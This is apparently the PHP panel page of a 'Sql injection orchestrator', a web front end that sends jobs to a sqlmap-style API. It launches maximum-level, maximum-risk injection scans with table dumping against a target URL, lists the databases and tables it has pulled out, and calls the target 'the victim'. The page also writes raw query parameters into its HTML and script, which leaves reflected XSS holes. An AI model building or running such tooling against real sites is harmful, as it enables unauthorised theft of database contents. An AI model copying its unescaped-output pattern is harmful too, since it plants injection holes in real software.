<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="panel.css">
<link rel="stylesheet" type="text/css" href="logs.css">
<title>Sql injection orchestrator v0.1</title>

<?php 
include 'util.php';
require_once "config.php";
// Initialize the session
session_start();

if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: login.php");
    exit;
}
else
{
	$logs = new \stdClass;
	if(isset($_GET["id"])) {
		$flag = true;
		if(isset($_GET["act"])) {
			if($_GET["act"] == "delete") { // DELETE DE LA TASK
				$flag = false;
			}
		}
		if($flag == true) { // CHARGEMENT NORMAL
		
			$callback_status = util::curl($_SESSION["endpoint"] . "/scan/" . $_GET["id"] . "/status");
			$task_status = json_decode($callback_status);
			
			$task_arr = [];
			$sql = "SELECT id, ownerid, target, action, started FROM scans WHERE id = ?";
			if($stmt = mysqli_prepare($link, $sql)){
				// Bind variables to the prepared statement as parameters
				mysqli_stmt_bind_param($stmt, "s", $param_id);
				
				// Set parameters
				$param_id = $_GET["id"];
				
				// Attempt to execute the prepared statement
				if(mysqli_stmt_execute($stmt)){
					// Store result
					mysqli_stmt_store_result($stmt);
					
					if(mysqli_stmt_num_rows($stmt) > 0){                    
						// Bind result variables
						mysqli_stmt_bind_result($stmt, $id, $owner_id, $target, $action, $date);
						
						while(mysqli_stmt_fetch($stmt)){
							$task_arr = ['id'=> $id, 'ownerId' => $owner_id, 'target' => $target, 'action' => $action, 'date' => $date];
						}
					} else{
						// Display an error message if username doesn't exist
						$scans_err = "No scans found with that user.";
						echo "<script>console.log('No scans found with that user.')</script>";
					}
				} else{
					echo "<script>alert('Oops! Something went wrong. Please try again later.')</script>";
				}
				// Close statement
				mysqli_stmt_close($stmt);
			}
			
			

				
			
			
			
		}
	}
	if(isset($_GET["id"]) && isset($_GET["act"])) {
		if($_GET["act"] == "delete") {
			$url_prepare = $_SESSION["endpoint"] . "/task/" . $_GET['id'] . "/delete";
			$callback = util::curl($url_prepare);
			$response = json_decode($callback,true); //because of true, it's in an array
			$status =  $response['success'];
			
			if($status == true) {
				echo "<script>console.log('deleted from sqlapi')</script>";
				$sql = "DELETE FROM scans where id = ?";
		 
				if($stmt = mysqli_prepare($link, $sql)){
					// Bind variables to the prepared statement as parameters
					mysqli_stmt_bind_param($stmt, "s", $param_id);
					
					// Set parameters
					$param_id = $_GET["id"];
					
					// Attempt to execute the prepared statement
					if(mysqli_stmt_execute($stmt)){
						// Redirect to login page
						header("location: dashboard.php");
					} else{
						echo "<script>console.log('error occured while deleting data')</script>";
					}

					// Close statement
					mysqli_stmt_close($stmt);
				}
			}
		}
		else if($_GET["act"] == "logs") {
			$url_prepare = $_SESSION["endpoint"] . "/scan/" . $_GET['id'] . "/log";
			$callback_logs = util::curl($url_prepare);
			$logs = json_decode($callback_logs,true); //because of true, it's in an array
			
			
		}
	}
}


?>


<div id="hacker-bar">
  <div class="container">

    <div class="row">
      <div class="col-md-12">
        <div class="panel panel-default" id="serverinfo">
          <div class="panel-heading">
            <a class="panel-title" href="/dashboard.php" style="color:red;">Back to dashboard</a>
			
          </div>
          <div class="panel-body">
            
            <div class="row">
              <div class="col-md-6">
                <div class="feed-widget__item">
                  <div class="feed-widget__ico">
                    <i class="fa fa-hourglass-end "></i>
                  </div>
                  <div class="feed-widget__info">
                    <div class="feed-widget__text"><b><a href="#">Status</a></b></div>
                    <div class="feed-widget__date"><?php echo $task_arr['action']; ?></div>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="feed-widget__item">
                  <div class="feed-widget__ico"><i class="fa fa-database"></i></div>
                  <div class="feed-widget__info">
                    <div class="feed-widget__text"><b><a href="#">Number of database</a></b> </div>
                    <div class="feed-widget__date"><?php $tmp = util::get_db_structure($_SESSION["endpoint"] . "/scan/" . $_GET["id"] . "/data");if($tmp!=NULL){echo sizeof($tmp);}else{echo "?";} ?></div>
                  </div>
                </div>
              </div>

              <div class="col-md-6">
                <div class="feed-widget__item">
                  <div class="feed-widget__ico">
                    <i class="fa fa-terminal"></i>
                  </div>
                  <div class="feed-widget__info">
                    <div class="feed-widget__text"><b><a href="#">Injection point</a></b></div>
                    <div class="feed-widget__date"><small><?php echo $task_arr['target']; ?></small></div>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="feed-widget__item">
                  <div class="feed-widget__ico"><i class="fa fa-calendar-o"></i></div>
                  <div class="feed-widget__info">
                    <div class="feed-widget__text"><b><a href="#">Start date</a></b> </div>
                    <div class="feed-widget__date"><?php echo $task_arr['date']; ?></small></div>
                  </div>
                </div>
              </div>
            </div>
            
          </div>
        </div>
      </div>
    </div>

    <div class="row">
      <div class="col-md-12">
        <div class="panel panel-default">
          <div class="panel-heading">
            <h3 class="panel-title">Actions</h3>
          </div>
          <div class="panel-body">
            <button class="btn btn-danger" onclick="document.location.href='/panel.php?id=<?php echo $_GET["id"]."&act=delete'\"";?>>Stop the task</button>
            <button class="btn" onclick="document.location.href='/panel.php?id=<?php echo $_GET["id"]."&act=dumpSection'\"";?>>Dump section</button>
            <button class="btn" onclick="document.location.href='/panel.php?id=<?php echo $_GET["id"]."&act=viewDatas'\"";?>>Dbs Structure</button>
            <button class="btn" onclick="document.location.href='/panel.php?id=<?php echo $_GET["id"]."&act=logs'\"";?>>View logs</button>
            <button class="btn" >Leave Message</button>
			<button class="btn btn-warning" disabled>Stacked Query</button>
			<button class="btn btn-warning" disabled>DBA Menu</button>
          </div>
        </div>
      </div>
    </div>

    <div class="row">
      <div class="col-md-12">
        <div class="panel panel-default">
          <div class="panel-heading">
            <h3 class="panel-title"><?php if(isset($_GET["act"])){echo $_GET["act"];}else{echo "PROCESSES";} ?></h3>
          </div>
          <div class="panel-body">
            <div class="task">
            <?php 
			if($task_arr['action'] != 'Crashed'){
				echo "<p>" . $task_arr['action'] . " is ". $task_status->status ."</p>";
				if($task_status->status != 'terminated') {
					echo "
						<div class=\"progress\">
						<div role=\"progressbar\" aria-valuenow=\"100\" aria-valuemin=\"0\" aria-valuemax=\"100\" style=\"width: 100%\" class=\"progress-bar progress-bar-info progress-bar-striped active\"></div>
						</div>
					";
				}
				else {
					echo "<p>You can now perform actions on the target using above buttons list, results will be display in this box.</p>";
				}
				if(isset($_GET["act"])) {
					if($_GET["act"] == 'logs') 
					{
						
						foreach ($logs['log'] as $log){
							$count = 0;
							$vl_message = "";
							$vl_severity = "";
							$vl_date = "";
							foreach ($log as $key => $value){
								//echo $key . " | " . $value . "<br>";
								if($count % 3 == 0) { // message
									$vl_message = $value;
								}
								if($count % 3 == 1) { // severity
									$vl_severity = $value;
								}
								if($count % 3 == 2) { // date
									$vl_date = $value;
									$toast_color = "";
									if($vl_severity == "INFO") {
										$toast_color = "blue";
									}
									if($vl_severity == "WARNING") {
										$toast_color = "yellow";
									}
									if($vl_severity == "ERROR") {
										$toast_color = "red";
									}
										echo "
											<div class=\"toast toast--" . $toast_color . " add-margin\">
												<div class=\"toast__icon\">

												</div>
												<div class=\"toast__content\">
													<p class=\"toast__type\">" . $vl_severity . "</p>
													<p class=\"toast__message\">". $vl_message . "</p>
												</div>
												<div class=\"toast__close\">
													<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 15.642 15.642\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" enable-background=\"new 0 0 15.642 15.642\">
													</svg>
											  </div>
											</div>

						";
									
								}
								
								$vl = $value;
								$count = $count + 1;
							}
						}
						
						
					}
					else if($_GET["act"] == 'viewDatas') {
						$dbs_struct = util::get_db_structure($_SESSION["endpoint"] . "/scan/" . $_GET["id"] . "/data");
						if($dbs_struct != NULL) {
							//echo var_dump($dbs_struct);
							echo "<br><nav class=\"nav\">
									<ul class=list>";
							$dbparam = "";
							$tbparam = "";
							$dbtbparam = "";
							
							if(isset($_GET["tables"])) {
								$dbtbparam = "&tables=".$_GET["tables"];
							}
							else
								$dbtbparam = "";
							
							
							foreach($dbs_struct as $db_name => $tables) {
								if(isset($_GET["db"])) {
									$db_param_array = explode(',', $_GET["db"]);
									if(!in_array($db_name,$db_param_array))
										$dbparam = $_GET["db"].",".$db_name;
									else
										$dbparam = $_GET["db"];
								}
								else {
									$dbparam = $db_name;
								}
								
								echo "<li><a href=\"/panel.php?id=" . $_GET["id"] . "&act=viewDatas&db=". $dbparam ."".$dbtbparam."\">".$db_name."</a>";
								foreach($tables as $table_name) {
									if(isset($_GET["tables"])) {
										$tb_param_array = explode(',', $_GET["tables"]);
										if(!in_array($table_name,$tb_param_array))
											$tbparam = $_GET["tables"].",".$table_name;
										else
											$tbparam = $_GET["tables"];
									}
									else
										$tbparam = $table_name;
									echo "<ul><li><a href=\"/panel.php?id=" . $_GET["id"] . "&act=viewDatas&db=". $dbparam ."&tables=".$tbparam."\">".$table_name."</a></li></ul>";
								}
								echo "</li>";
							}
							echo "</ul>
								</nav>";
							$newtask_db_param = "";
							$newtask_tb_param = "";
							if(isset($_GET["db"])) {
								$newtask_db_param = $_GET["db"];
								echo "
									<div class=\"software\">
										<p>target databases</p>";
								$db_param_array = explode(',', $_GET["db"]);
								foreach($db_param_array as $db) {
									echo "<code>$db</code>";
								}
								echo "
									</div>
								";
							}
							if(isset($_GET["tables"])) {
								$newtask_tb_param = $_GET["tables"];
								echo "
									<div class=\"software\">
										<p>target tables</p>";
								$tb_param_array = explode(',', $_GET["tables"]);
								foreach($tb_param_array as $tb) {
									echo "<code>$tb</code>";
								}
								echo "
									</div>
								";
								
							}
							if($newtask_db_param != NULL)
								$newtask_db_param = "&db=".$newtask_db_param;
							else
								$newtask_db_param = "";
							
							if($newtask_tb_param != NULL)
								$newtask_tb_param = "&tables=".$newtask_tb_param;
							else
								$newtask_tb_param = "";
							
							echo "
							<br>
							<button class=\"btn\" onclick=\"document.location.href='/panel.php?id=" . $_GET["id"] . "&act=newTask".$newtask_db_param."".$newtask_tb_param."'\"\";?>Start task</button>
							<button class=\"btn\" onclick=\"document.location.href='/panel.php?id=" . $_GET["id"] . "&act=viewDatas".$newtask_tb_param."'\"\";?>Reset Dbs</button>
							<button class=\"btn\" onclick=\"document.location.href='/panel.php?id=" . $_GET["id"] . "&act=viewDatas".$newtask_db_param."'\"\";?>Reset tables</button>
		
							";
						}
						else {
							echo "
								<h3>No database structure.</h3>
								<p>No database structure avaible in this task's memory, try to navigate <a href=\"/panel.php?id=" . $_GET["id"] . "&act=dumpSection\">to the dump section</a>.</p>
								
							";
						}

					}
					else if($_GET["act"] == 'dumpSection') {
						$dbs_dump_struct = util::get_tbs_dump($_SESSION["endpoint"] . "/scan/" . $_GET["id"] . "/data");
						echo var_dump($dbs_dump_struct);
					}
					else if($_GET["act"] == 'newTask') {
						// Call WS to create new scan/
						
						$callback_newtask = util::curl($_SESSION["endpoint"] . "/task/new");
						$newtask_id = json_decode($callback_newtask,true)['taskid'];
						echo "<script>console.log('task created with id " . $newtask_id . "')</script>";
						
						$params_array = [];
						if(isset($_GET["db"]) && isset($_GET["tables"])) {
							// add 2 params
							$params_array = ['url'=>$task_arr['target'],'level'=>5,'risk'=>3,'forms'=>true,'db'=>$_GET["db"],'tbl'=>$_GET["tables"],'dumpTable'=>true];
						}
						else if(isset($_GET["db"])) {
							// add db param
							$params_array = ['url'=>$task_arr['target'],'level'=>5,'risk'=>3,'forms'=>true,'db'=>$_GET["db"],'dumpTable'=>true];
						}
						else if(isset($_GET["tables"])) {
							// add tables param
							$params_array = ['url'=>$task_arr['target'],'level'=>5,'risk'=>3,'forms'=>true,'tbl'=>$_GET["tables"],'dumpTable'=>true];
						}
						else {
							// add only basics options, dont specify db and tables
							$params_array = ['url'=>$task_arr['target'],'level'=>5,'risk'=>3,'forms'=>true,'dumpTable'=>true];
						}
						
						$params = json_encode($params_array);
						$callback_newtask_scan = util::curl_post($_SESSION["endpoint"] . "/scan/" . $newtask_id . "/start", $params);
						$scan_status = json_decode($callback_newtask_scan,true);
						
						
						echo "<script>alert('task created !\n  Id : ". $newtask_id ."\n  Params : " . $params . "')</script>";
						
						// iNSERT SCAN IN DB
						$sql = "INSERT INTO scans (id, ownerid, target, action, started) VALUES (?, ?, ?, ?, NOW())";
						if($stmt = mysqli_prepare($link, $sql)){
							// Bind variables to the prepared statement as parameters
							mysqli_stmt_bind_param($stmt, "ssss", $param_id, $param_ownerid, $param_target, $param_action);
							
							// Set parameters
							$param_id = $newtask_id;
							$param_ownerid = $_SESSION["userId"];
							$param_target = $task_arr['target'];
							$param_action = 'Dump';
							
							// Attempt to execute the prepared statement
							if(mysqli_stmt_execute($stmt)){
								// Redirect to login page
								echo "<script>window.location.href = \"/dashboard.php\"</script>";
							} else{
								echo "<script>console.log('error occured while executing sql statement')</script>";
							}

							// Close statement
							mysqli_stmt_close($stmt);
						}
						
					}
				}
				
			}
			else {
				echo "<p>This task has crashed, usualy it's due to improper https configuration of the victim, please report this incident to the dev.</p>";
			}
			?>
              
            </div>
          </div>
        </div>
      </div>
    </div>

  </div>
</div>